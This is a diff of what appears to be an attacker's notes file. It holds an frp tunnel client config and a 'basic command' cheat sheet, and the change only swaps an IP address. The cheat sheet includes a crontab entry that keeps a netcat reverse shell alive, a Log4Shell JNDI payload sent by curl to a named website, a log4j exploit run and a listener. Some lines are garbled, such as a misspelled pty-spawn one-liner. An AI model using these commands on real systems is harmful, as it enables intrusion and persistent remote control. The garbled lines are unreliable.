@@ -61,7 +61,7 @@ enable_prometheus = true
 # 客户端配置
 [common]
 #服务器ip    
-server_addr = 119.91.116.174
+server_addr = 119.91.116.17
 server_port = 7000
  # 与frps.ini的token一致
 #token = 12345678
@@ -78,9 +78,9 @@ remote_port = 8000
 # basic command
 ```
 crontab -e */1 * * * * nc 192.168.59.236 6666 -e "/bin/bash"
-sudo log4j.py --userip 119.91.116.174 --webport 8000 --lport 9999
+sudo log4j.py --userip 119.91.116.17 --webport 8000 --lport 9999
 rlwrap nc -lvvp 8888
-curl -H 'X-Api-Version: ${jndi:ldap://119.91.116.174/a}' https://docker.zzzang.cn/
+curl -H 'X-Api-Version: ${jndi:ldap://119.91.116.17/a}' https://docker.zzzang.cn/
 python3 -c "import spy;spy.swapn('/bin/bash')"
 nmap -p- x.x.x.x -oN t.log
 gobuster dir -u -w seclissts -x php，zip
